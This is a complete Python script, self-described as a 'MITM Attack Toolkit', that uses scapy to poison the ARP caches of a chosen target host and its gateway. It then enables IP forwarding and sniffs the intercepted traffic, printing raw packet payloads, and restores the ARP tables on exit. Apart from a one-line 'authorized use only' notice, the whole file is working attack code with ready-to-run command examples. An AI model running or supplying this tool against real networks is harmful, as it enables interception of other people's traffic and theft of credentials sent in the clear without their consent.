#!/usr/bin/env python3
"""
MITM Attack Toolkit — ARP Spoofing, Packet Sniffing & Forwarding
Authorized use only. Target: single host behind a gateway.
"""

import sys
import time
import threading
import argparse
from datetime import datetime
from colorama import Fore, Style, init

from scapy.all import (
    ARP, Ether, IP, TCP, UDP, ICMP, Raw,
    sniff, sendp, srp, conf, get_if_hwaddr
)

init(autoreset=True)

# ---------- Globals ----------
TARGET_IP    = None
GATEWAY_IP   = None
TARGET_MAC   = None
GATEWAY_MAC  = None
MY_MAC       = None
STOP_EVENT   = threading.Event()

# ---------- Utility ----------
def get_mac(ip):
    """Resolve MAC for a given IP via ARP."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3, verbose=0
    )
    for _, recv in ans:
        return recv.hwsrc
    return None

def enable_ip_forward():
    """Enable IPv4 forwarding on Linux."""
    import subprocess
    try:
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            check=True, capture_output=True
        )
        print(f"{Fore.GREEN}[+] IP forwarding enabled")
    except Exception as e:
        print(f"{Fore.YELLOW}[!] Could not enable IP forwarding: {e}")
        print(f"{Fore.YELLOW}    Run manually: sysctl -w net.ipv4.ip_forward=1")

def disable_ip_forward():
    """Disable IPv4 forwarding on Linux (cleanup)."""
    import subprocess
    try:
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=0"],
            check=True, capture_output=True
        )
        print(f"{Fore.GREEN}[+] IP forwarding disabled")
    except Exception:
        pass

# ---------- ARP Spoofing ----------
def arp_spoof(target_ip, target_mac, source_ip):
    """Send forged ARP replies to poison the target's ARP cache."""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,                 # ARP reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,       # We claim to be this IP
        hwsrc=MY_MAC          # Our real MAC
    )
    sendp(pkt, verbose=0)

def arp_restore(target_ip, target_mac, source_ip, source_mac):
    """Restore ARP cache to original state (cleanup)."""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac      # Real MAC of the source
    )
    sendp(pkt, count=4, verbose=0)

def spoof_loop():
    """Continuously poison both target and gateway ARP caches."""
    print(f"\n{Fore.CYAN}[*] ARP spoofing started — poisoning every 2 seconds")
    print(f"{Fore.CYAN}    Target : {TARGET_IP}  ({TARGET_MAC})")
    print(f"{Fore.CYAN}    Gateway: {GATEWAY_IP} ({GATEWAY_MAC})")
    print(f"{Fore.CYAN}    Our MAC: {MY_MAC}")
    print(f"{Fore.CYAN}    Press Ctrl+C to stop and restore ARP tables\n")

    while not STOP_EVENT.is_set():
        # Tell target that WE are the gateway
        arp_spoof(TARGET_IP, TARGET_MAC, GATEWAY_IP)
        # Tell gateway that WE are the target
        arp_spoof(GATEWAY_IP, GATEWAY_MAC, TARGET_IP)
        time.sleep(2)

def restore_arp():
    """Restore original ARP entries on both sides."""
    print(f"\n{Fore.YELLOW}[*] Restoring ARP tables...")
    real_gw_mac = get_mac(GATEWAY_IP)
    real_tgt_mac = get_mac(TARGET_IP)
    if real_gw_mac:
        arp_restore(TARGET_IP, TARGET_MAC, GATEWAY_IP, real_gw_mac)
    if real_tgt_mac:
        arp_restore(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, real_tgt_mac)
    print(f"{Fore.GREEN}[+] ARP tables restored")

# ---------- Packet Sniffing ----------
def packet_callback(pkt):
    """Process each captured packet."""
    if not pkt.haslayer(IP):
        return

    ip = pkt[IP]
    proto = "???"
    if pkt.haslayer(TCP):
        proto = f"TCP  {pkt[TCP].sport:>5} -> {pkt[TCP].dport:<5}"
    elif pkt.haslayer(UDP):
        proto = f"UDP  {pkt[UDP].sport:>5} -> {pkt[UDP].dport:<5}"
    elif pkt.haslayer(ICMP):
        proto = f"ICMP type={pkt[ICMP].type} code={pkt[ICMP].code}"

    payload = ""
    if pkt.haslayer(Raw):
        raw = pkt[Raw].load
        if len(raw) < 120:
            payload = repr(raw)
        else:
            payload = repr(raw[:80]) + f" ... ({len(raw)} total bytes)"

    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]

    # Colour by direction
    if ip.src == TARGET_IP:
        colour = Fore.GREEN   # Outbound from target
    else:
        colour = Fore.BLUE    # Inbound to target

    print(f"{colour}[{ts}] {ip.src:>15} -> {ip.dst:<15} | {proto}  {payload}")

def start_sniffer(interface):
    """Start sniffing in a separate thread."""
    print(f"{Fore.MAGENTA}[*] Sniffing on {interface}...\n")
    sniff(
        iface=interface,
        prn=packet_callback,
        store=False,
        stop_filter=lambda _: STOP_EVENT.is_set()
    )

# ---------- Main ----------
def main():
    global TARGET_IP, GATEWAY_IP, TARGET_MAC, GATEWAY_MAC, MY_MAC

    parser = argparse.ArgumentParser(
        description="MITM — ARP Spoofing + Packet Sniffer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 mitm.py --target 192.168.1.42 --gateway 192.168.1.1
  python3 mitm.py -t 192.168.1.42 -g 192.168.1.1 -i eth0
        """
    )
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address (usually .1)")
    parser.add_argument("-i", "--interface", default=None, help="Network interface (default: Scapy's default)")
    args = parser.parse_args()

    TARGET_IP  = args.target
    GATEWAY_IP = args.gateway
    interface  = args.interface or conf.iface

    # Resolve our own MAC address from the interface
    MY_MAC = get_if_hwaddr(interface)
    print(f"{Fore.CYAN}[*] Our MAC on {interface}: {MY_MAC}")

    # Resolve target and gateway MAC addresses
    print(f"{Fore.CYAN}[*] Resolving MAC addresses...")
    TARGET_MAC = get_mac(TARGET_IP)
    if not TARGET_MAC:
        print(f"{Fore.RED}[-] Could not resolve MAC for target {TARGET_IP}")
        sys.exit(1)
    print(f"{Fore.GREEN}[+] Target  {TARGET_IP} -> {TARGET_MAC}")

    GATEWAY_MAC = get_mac(GATEWAY_IP)
    if not GATEWAY_MAC:
        print(f"{Fore.RED}[-] Could not resolve MAC for gateway {GATEWAY_IP}")
        sys.exit(1)
    print(f"{Fore.GREEN}[+] Gateway {GATEWAY_IP} -> {GATEWAY_MAC}")

    # Enable IP forwarding so target still reaches the Internet
    enable_ip_forward()

    # Start sniffer thread
    sniffer_thread = threading.Thread(
        target=start_sniffer, args=(interface,), daemon=True
    )
    sniffer_thread.start()

    try:
        # Start ARP spoofing (blocking until Ctrl+C)
        spoof_loop()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user")
    finally:
        STOP_EVENT.set()
        time.sleep(1)      # Let sniffer finish current packet
        restore_arp()
        disable_ip_forward()
        print(f"{Fore.GREEN}[+] Cleanup complete. Exiting.")

if __name__ == "__main__":
    main()
